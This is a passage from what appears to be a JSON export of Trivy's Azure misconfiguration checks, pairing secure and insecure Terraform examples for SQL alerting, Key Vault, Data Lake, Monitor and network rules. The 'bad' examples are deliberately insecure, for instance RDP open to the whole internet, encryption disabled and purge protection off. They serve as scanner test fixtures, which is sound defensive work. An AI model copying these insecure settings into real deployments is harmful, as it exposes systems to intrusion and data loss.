              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_addresses"
            ],
            "good": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts = [\n    \"Sql_Injection\",\n    \"Data_Exfiltration\"\n  ]\n  email_addresses = [\"db-security@acme.org\"]\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts = [\n    \"Sql_Injection\",\n    \"Data_Exfiltration\"\n  ]\n  email_addresses = []\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-THREAT_ALERT_EMAIL_TO_OWNER",
        "title": "Threat Alert Email To Owner",
        "provider": "azure",
        "service": "database",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_account_admins\n  good:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts            = []\n\n        email_account_admins = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts = [\n        ]\n        email_account_admins = false\n      }\n",
        "file_name": "threat_alert_email_to_owner.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/threat_alert_email_to_owner.yaml",
        "local_path": "azure/database/threat_alert_email_to_owner.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#email_account_admins"
            ],
            "good": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts            = []\n\n  email_account_admins = true\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts = [\n  ]\n  email_account_admins = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATAFACTORY-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "azure",
        "service": "datafactory",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_factory#public_network_enabled\n  good:\n    - |-\n      resource \"azurerm_data_factory\" \"good_example\" {\n        name                   = \"example\"\n        location               = azurerm_resource_group.example.location\n        resource_group_name    = azurerm_resource_group.example.name\n        public_network_enabled = false\n      }\n  bad:\n    - |-\n      resource \"azurerm_data_factory\" \"bad_example\" {\n        name                = \"example\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/datafactory/no_public_access.yaml",
        "local_path": "azure/datafactory/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_factory#public_network_enabled"
            ],
            "good": [
              "resource \"azurerm_data_factory\" \"good_example\" {\n  name                   = \"example\"\n  location               = azurerm_resource_group.example.location\n  resource_group_name    = azurerm_resource_group.example.name\n  public_network_enabled = false\n}"
            ],
            "bad": [
              "resource \"azurerm_data_factory\" \"bad_example\" {\n  name                = \"example\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATALAKE-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "azure",
        "service": "datalake",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store\n  good:\n    - |-\n      resource \"azurerm_data_lake_store\" \"good_example\" {\n        encryption_state = \"Enabled\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_data_lake_store\" \"bad_example\" {\n        encryption_state = \"Disabled\"\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/datalake/enable_at_rest_encryption.yaml",
        "local_path": "azure/datalake/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store"
            ],
            "good": [
              "resource \"azurerm_data_lake_store\" \"good_example\" {\n  encryption_state = \"Enabled\"\n}"
            ],
            "bad": [
              "resource \"azurerm_data_lake_store\" \"bad_example\" {\n  encryption_state = \"Disabled\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-CONTENT_TYPE_FOR_SECRET",
        "title": "Content Type For Secret",
        "provider": "azure",
        "service": "keyvault",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#content_type\n  good:\n    - |-\n      resource \"azurerm_key_vault_secret\" \"good_example\" {\n        name         = \"secret-sauce\"\n        value        = \"szechuan\"\n        key_vault_id = azurerm_key_vault.example.id\n        content_type = \"password\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault_secret\" \"bad_example\" {\n        name         = \"secret-sauce\"\n        value        = \"szechuan\"\n        key_vault_id = azurerm_key_vault.example.id\n      }\n",
        "file_name": "content_type_for_secret.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/content_type_for_secret.yaml",
        "local_path": "azure/keyvault/content_type_for_secret.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#content_type"
            ],
            "good": [
              "resource \"azurerm_key_vault_secret\" \"good_example\" {\n  name         = \"secret-sauce\"\n  value        = \"szechuan\"\n  key_vault_id = azurerm_key_vault.example.id\n  content_type = \"password\"\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault_secret\" \"bad_example\" {\n  name         = \"secret-sauce\"\n  value        = \"szechuan\"\n  key_vault_id = azurerm_key_vault.example.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-ENSURE_KEY_EXPIRY",
        "title": "Ensure Key Expiry",
        "provider": "azure",
        "service": "keyvault",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_key#expiration_date\n  good:\n    - |-\n      resource \"azurerm_key_vault_key\" \"good_example\" {\n        name            = \"generated-certificate\"\n        key_vault_id    = azurerm_key_vault.example.id\n        key_type        = \"RSA\"\n        key_size        = 2048\n        expiration_date = \"1982-12-31T00:00:00Z\"\n\n        key_opts = [\n          \"decrypt\",\n          \"encrypt\",\n          \"sign\",\n          \"unwrapKey\",\n          \"verify\",\n          \"wrapKey\",\n        ]\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault_key\" \"bad_example\" {\n        name         = \"generated-certificate\"\n        key_vault_id = azurerm_key_vault.example.id\n        key_type     = \"RSA\"\n        key_size     = 2048\n\n        key_opts = [\n          \"decrypt\",\n          \"encrypt\",\n          \"sign\",\n          \"unwrapKey\",\n          \"verify\",\n          \"wrapKey\",\n        ]\n      }\n",
        "file_name": "ensure_key_expiry.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/ensure_key_expiry.yaml",
        "local_path": "azure/keyvault/ensure_key_expiry.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_key#expiration_date"
            ],
            "good": [
              "resource \"azurerm_key_vault_key\" \"good_example\" {\n  name            = \"generated-certificate\"\n  key_vault_id    = azurerm_key_vault.example.id\n  key_type        = \"RSA\"\n  key_size        = 2048\n  expiration_date = \"1982-12-31T00:00:00Z\"\n\n  key_opts = [\n    \"decrypt\",\n    \"encrypt\",\n    \"sign\",\n    \"unwrapKey\",\n    \"verify\",\n    \"wrapKey\",\n  ]\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault_key\" \"bad_example\" {\n  name         = \"generated-certificate\"\n  key_vault_id = azurerm_key_vault.example.id\n  key_type     = \"RSA\"\n  key_size     = 2048\n\n  key_opts = [\n    \"decrypt\",\n    \"encrypt\",\n    \"sign\",\n    \"unwrapKey\",\n    \"verify\",\n    \"wrapKey\",\n  ]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-ENSURE_SECRET_EXPIRY",
        "title": "Ensure Secret Expiry",
        "provider": "azure",
        "service": "keyvault",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#expiration_date\n  good:\n    - |-\n      resource \"azurerm_key_vault_secret\" \"good_example\" {\n        name            = \"secret-sauce\"\n        value           = \"szechuan\"\n        key_vault_id    = azurerm_key_vault.example.id\n        expiration_date = \"1982-12-31T00:00:00Z\"\n      }\n    - |-\n      resource \"azuread_application\" \"myapp\" {\n        display_name = \"MyAzureAD App\"\n\n        group_membership_claims = [\"ApplicationGroup\"]\n        prevent_duplicate_names = true\n\n      }\n\n      resource \"azuread_application_password\" \"myapp\" {\n        application_object_id = azuread_application.myapp.object_id\n        end_date              = \"2024-12-18T00:00:00Z\"\n      }\n\n      resource \"azurerm_key_vault_secret\" \"myapp_pass\" {\n        name            = \"myapp-oauth\"\n        value           = azuread_application_password.myapp.value\n        key_vault_id    = azurerm_key_vault.cluster_key_vault.id\n        expiration_date = azuread_application_password.myapp.end_date\n        content_type    = \"Password\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault_secret\" \"bad_example\" {\n        name         = \"secret-sauce\"\n        value        = \"szechuan\"\n        key_vault_id = azurerm_key_vault.example.id\n      }\n",
        "file_name": "ensure_secret_expiry.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/ensure_secret_expiry.yaml",
        "local_path": "azure/keyvault/ensure_secret_expiry.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault_secret#expiration_date"
            ],
            "good": [
              "resource \"azurerm_key_vault_secret\" \"good_example\" {\n  name            = \"secret-sauce\"\n  value           = \"szechuan\"\n  key_vault_id    = azurerm_key_vault.example.id\n  expiration_date = \"1982-12-31T00:00:00Z\"\n}",
              "resource \"azuread_application\" \"myapp\" {\n  display_name = \"MyAzureAD App\"\n\n  group_membership_claims = [\"ApplicationGroup\"]\n  prevent_duplicate_names = true\n\n}\n\nresource \"azuread_application_password\" \"myapp\" {\n  application_object_id = azuread_application.myapp.object_id\n  end_date              = \"2024-12-18T00:00:00Z\"\n}\n\nresource \"azurerm_key_vault_secret\" \"myapp_pass\" {\n  name            = \"myapp-oauth\"\n  value           = azuread_application_password.myapp.value\n  key_vault_id    = azurerm_key_vault.cluster_key_vault.id\n  expiration_date = azuread_application_password.myapp.end_date\n  content_type    = \"Password\"\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault_secret\" \"bad_example\" {\n  name         = \"secret-sauce\"\n  value        = \"szechuan\"\n  key_vault_id = azurerm_key_vault.example.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-NO_PURGE",
        "title": "No Purge",
        "provider": "azure",
        "service": "keyvault",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled\n  good:\n    - |-\n      resource \"azurerm_key_vault\" \"good_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.test.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 7\n        purge_protection_enabled    = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault\" \"bad_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.test.location\n        enabled_for_disk_encryption = true\n        purge_protection_enabled    = false\n      }\n    - |-\n      resource \"azurerm_key_vault\" \"bad_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.test.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 2\n        purge_protection_enabled    = true\n      }\n    - |-\n      resource \"azurerm_key_vault\" \"bad_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.test.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 100\n        purge_protection_enabled    = true\n      }\n",
        "file_name": "no_purge.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/no_purge.yaml",
        "local_path": "azure/keyvault/no_purge.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#purge_protection_enabled"
            ],
            "good": [
              "resource \"azurerm_key_vault\" \"good_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.test.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 7\n  purge_protection_enabled    = true\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault\" \"bad_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.test.location\n  enabled_for_disk_encryption = true\n  purge_protection_enabled    = false\n}",
              "resource \"azurerm_key_vault\" \"bad_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.test.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 2\n  purge_protection_enabled    = true\n}",
              "resource \"azurerm_key_vault\" \"bad_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.test.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 100\n  purge_protection_enabled    = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-KEYVAULT-SPECIFY_NETWORK_ACL",
        "title": "Specify Network Acl",
        "provider": "azure",
        "service": "keyvault",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls\n  good:\n    - |-\n      resource \"azurerm_key_vault\" \"good_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.good_example.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 7\n        purge_protection_enabled    = false\n\n        network_acls {\n          bypass         = \"AzureServices\"\n          default_action = \"Deny\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_key_vault\" \"bad_example\" {\n        name                        = \"examplekeyvault\"\n        location                    = azurerm_resource_group.bad_example.location\n        enabled_for_disk_encryption = true\n        soft_delete_retention_days  = 7\n        purge_protection_enabled    = false\n      }\n",
        "file_name": "specify_network_acl.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/keyvault/specify_network_acl.yaml",
        "local_path": "azure/keyvault/specify_network_acl.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/key_vault#network_acls"
            ],
            "good": [
              "resource \"azurerm_key_vault\" \"good_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.good_example.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 7\n  purge_protection_enabled    = false\n\n  network_acls {\n    bypass         = \"AzureServices\"\n    default_action = \"Deny\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_key_vault\" \"bad_example\" {\n  name                        = \"examplekeyvault\"\n  location                    = azurerm_resource_group.bad_example.location\n  enabled_for_disk_encryption = true\n  soft_delete_retention_days  = 7\n  purge_protection_enabled    = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-MONITOR-ACTIVITY_LOG_RETENTION_SET",
        "title": "Activity Log Retention Set",
        "provider": "azure",
        "service": "monitor",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#retention_policy\n  good:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"good_example\" {\n        name = \"good_example\"\n\n        retention_policy {\n          enabled = true\n          days    = 365\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n        name = \"bad_example\"\n\n        retention_policy {\n          enabled = true\n        }\n      }\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n        name = \"bad_example\"\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n",
        "file_name": "activity_log_retention_set.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/monitor/activity_log_retention_set.yaml",
        "local_path": "azure/monitor/activity_log_retention_set.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#retention_policy"
            ],
            "good": [
              "resource \"azurerm_monitor_log_profile\" \"good_example\" {\n  name = \"good_example\"\n\n  retention_policy {\n    enabled = true\n    days    = 365\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n  name = \"bad_example\"\n\n  retention_policy {\n    enabled = true\n  }\n}",
              "resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n  name = \"bad_example\"\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-MONITOR-CAPTURE_ALL_ACTIVITIES",
        "title": "Capture All Activities",
        "provider": "azure",
        "service": "monitor",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#categories\n  good:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"good_example\" {\n        name = \"good_example\"\n\n        categories = [\n          \"Action\",\n          \"Delete\",\n          \"Write\",\n        ]\n\n        retention_policy {\n          enabled = true\n          days    = 365\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n        name = \"bad_example\"\n\n        categories = []\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n",
        "file_name": "capture_all_activities.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/monitor/capture_all_activities.yaml",
        "local_path": "azure/monitor/capture_all_activities.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#categories"
            ],
            "good": [
              "resource \"azurerm_monitor_log_profile\" \"good_example\" {\n  name = \"good_example\"\n\n  categories = [\n    \"Action\",\n    \"Delete\",\n    \"Write\",\n  ]\n\n  retention_policy {\n    enabled = true\n    days    = 365\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n  name = \"bad_example\"\n\n  categories = []\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-MONITOR-CAPTURE_ALL_REGIONS",
        "title": "Capture All Regions",
        "provider": "azure",
        "service": "monitor",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#locations\n  good:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"good_example\" {\n        name = \"bad_example\"\n\n        categories = []\n\n        locations = [\n          \"eastus\",\n          \"eastus2\",\n          \"southcentralus\",\n          \"westus2\",\n          \"westus3\",\n          \"australiaeast\",\n          \"southeastasia\",\n          \"northeurope\",\n          \"swedencentral\",\n          \"uksouth\",\n          \"westeurope\",\n          \"centralus\",\n          \"northcentralus\",\n          \"westus\",\n          \"southafricanorth\",\n          \"centralindia\",\n          \"eastasia\",\n          \"japaneast\",\n          \"jioindiawest\",\n          \"koreacentral\",\n          \"canadacentral\",\n          \"francecentral\",\n          \"germanywestcentral\",\n          \"norwayeast\",\n          \"switzerlandnorth\",\n          \"uaenorth\",\n          \"brazilsouth\",\n          \"centralusstage\",\n          \"eastusstage\",\n          \"eastus2stage\",\n          \"northcentralusstage\",\n          \"southcentralusstage\",\n          \"westusstage\",\n          \"westus2stage\",\n          \"asia\",\n          \"asiapacific\",\n          \"australia\",\n          \"brazil\",\n          \"canada\",\n          \"europe\",\n          \"global\",\n          \"india\",\n          \"japan\",\n          \"uk\",\n          \"unitedstates\",\n          \"eastasiastage\",\n          \"southeastasiastage\",\n          \"centraluseuap\",\n          \"eastus2euap\",\n          \"westcentralus\",\n          \"southafricawest\",\n          \"australiacentral\",\n          \"australiacentral2\",\n          \"australiasoutheast\",\n          \"japanwest\",\n          \"jioindiacentral\",\n          \"koreasouth\",\n          \"southindia\",\n          \"westindia\",\n          \"canadaeast\",\n          \"francesouth\",\n          \"germanynorth\",\n          \"norwaywest\",\n          \"swedensouth\",\n          \"switzerlandwest\",\n          \"ukwest\",\n          \"uaecentral\",\n          \"brazilsoutheast\",\n        ]\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n        name = \"bad_example\"\n\n        categories = []\n\n        locations = [\n          \"westus\",\n          \"global\",\n        ]\n\n        retention_policy {\n          enabled = true\n          days    = 7\n        }\n      }\n",
        "file_name": "capture_all_regions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/monitor/capture_all_regions.yaml",
        "local_path": "azure/monitor/capture_all_regions.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/monitor_log_profile#locations"
            ],
            "good": [
              "resource \"azurerm_monitor_log_profile\" \"good_example\" {\n  name = \"bad_example\"\n\n  categories = []\n\n  locations = [\n    \"eastus\",\n    \"eastus2\",\n    \"southcentralus\",\n    \"westus2\",\n    \"westus3\",\n    \"australiaeast\",\n    \"southeastasia\",\n    \"northeurope\",\n    \"swedencentral\",\n    \"uksouth\",\n    \"westeurope\",\n    \"centralus\",\n    \"northcentralus\",\n    \"westus\",\n    \"southafricanorth\",\n    \"centralindia\",\n    \"eastasia\",\n    \"japaneast\",\n    \"jioindiawest\",\n    \"koreacentral\",\n    \"canadacentral\",\n    \"francecentral\",\n    \"germanywestcentral\",\n    \"norwayeast\",\n    \"switzerlandnorth\",\n    \"uaenorth\",\n    \"brazilsouth\",\n    \"centralusstage\",\n    \"eastusstage\",\n    \"eastus2stage\",\n    \"northcentralusstage\",\n    \"southcentralusstage\",\n    \"westusstage\",\n    \"westus2stage\",\n    \"asia\",\n    \"asiapacific\",\n    \"australia\",\n    \"brazil\",\n    \"canada\",\n    \"europe\",\n    \"global\",\n    \"india\",\n    \"japan\",\n    \"uk\",\n    \"unitedstates\",\n    \"eastasiastage\",\n    \"southeastasiastage\",\n    \"centraluseuap\",\n    \"eastus2euap\",\n    \"westcentralus\",\n    \"southafricawest\",\n    \"australiacentral\",\n    \"australiacentral2\",\n    \"australiasoutheast\",\n    \"japanwest\",\n    \"jioindiacentral\",\n    \"koreasouth\",\n    \"southindia\",\n    \"westindia\",\n    \"canadaeast\",\n    \"francesouth\",\n    \"germanynorth\",\n    \"norwaywest\",\n    \"swedensouth\",\n    \"switzerlandwest\",\n    \"ukwest\",\n    \"uaecentral\",\n    \"brazilsoutheast\",\n  ]\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_monitor_log_profile\" \"bad_example\" {\n  name = \"bad_example\"\n\n  categories = []\n\n  locations = [\n    \"westus\",\n    \"global\",\n  ]\n\n  retention_policy {\n    enabled = true\n    days    = 7\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-NETWORK-DISABLE_RDP_FROM_INTERNET",
        "title": "Disable Rdp From Internet",
        "provider": "azure",
        "service": "network",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges\n  good:\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        name                       = \"good_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_ranges    = [\"3389\"]\n        source_address_prefix      = \"4.53.160.75\"\n        destination_address_prefix = \"*\"\n      }\n\n      resource \"azurerm_network_security_group\" \"example\" {\n        name                = \"tf-appsecuritygroup\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        security_rule {\n          source_port_range          = \"any\"\n          destination_port_ranges    = [\"3389\"]\n          source_address_prefix      = \"4.53.160.75\"\n          destination_address_prefix = \"*\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_security_rule\" \"bad_example\" {\n        name                       = \"bad_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_ranges    = [\"3389\"]\n        source_address_prefix      = \"*\"\n        destination_address_prefix = \"*\"\n      }\n\n      resource \"azurerm_network_security_group\" \"example\" {\n        name                = \"tf-appsecuritygroup\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n\n        security_rule {\n          source_port_range          = \"any\"\n          destination_port_ranges    = [\"3389\"]\n          source_address_prefix      = \"*\"\n          destination_address_prefix = \"*\"\n        }\n      }\n",
        "file_name": "disable_rdp_from_internet.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/disable_rdp_from_internet.yaml",
        "local_path": "azure/network/disable_rdp_from_internet.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges"
            ],
            "good": [
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  name                       = \"good_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_ranges    = [\"3389\"]\n  source_address_prefix      = \"4.53.160.75\"\n  destination_address_prefix = \"*\"\n}\n\nresource \"azurerm_network_security_group\" \"example\" {\n  name                = \"tf-appsecuritygroup\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  security_rule {\n    source_port_range          = \"any\"\n    destination_port_ranges    = [\"3389\"]\n    source_address_prefix      = \"4.53.160.75\"\n    destination_address_prefix = \"*\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_network_security_rule\" \"bad_example\" {\n  name                       = \"bad_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_ranges    = [\"3389\"]\n  source_address_prefix      = \"*\"\n  destination_address_prefix = \"*\"\n}\n\nresource \"azurerm_network_security_group\" \"example\" {\n  name                = \"tf-appsecuritygroup\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n\n  security_rule {\n    source_port_range          = \"any\"\n    destination_port_ranges    = [\"3389\"]\n    source_address_prefix      = \"*\"\n    destination_address_prefix = \"*\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-NETWORK-NO_PUBLIC_EGRESS",
        "title": "No Public Egress",
        "provider": "azure",
        "service": "network",
        "language": "arm_template",
